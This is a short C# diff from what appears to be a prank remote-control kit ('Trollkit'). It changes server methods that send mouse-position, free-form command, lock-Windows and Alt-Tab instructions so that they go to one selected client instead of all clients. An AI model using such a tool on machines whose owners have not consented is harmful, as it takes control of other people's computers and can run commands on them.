@@ -41,25 +41,25 @@ namespace Trollkit_Library.ViewModels.Commands
             //string X = TbXcoordinate.Text;
             //string Y = TbYcoordinate.Text;
             TransferCommandObject returnObject = new TransferCommandObject { Command = "MousePosition", Handler = handler, Value = $"{XCoordinate},{YCoordinate}" };
-            _server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
+            _server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
         }
 
         private void SendGo()
         {
             TransferCommandObject returnObject = new TransferCommandObject { Command = "Command", Handler = handler, Value = CommandText};
-             _server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
+             _server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
         }
 
         private void SendLockWindowsk()
         {
             TransferCommandObject returnObject = new TransferCommandObject { Command = "LockWindows", Handler = handler };
-             _server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
+             _server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
         }
 
         private void SendAltTab()
         {
             TransferCommandObject returnObject = new TransferCommandObject { Command = "AltTab", Handler = handler };
-            _server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
+            _server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
     }
     }
 }
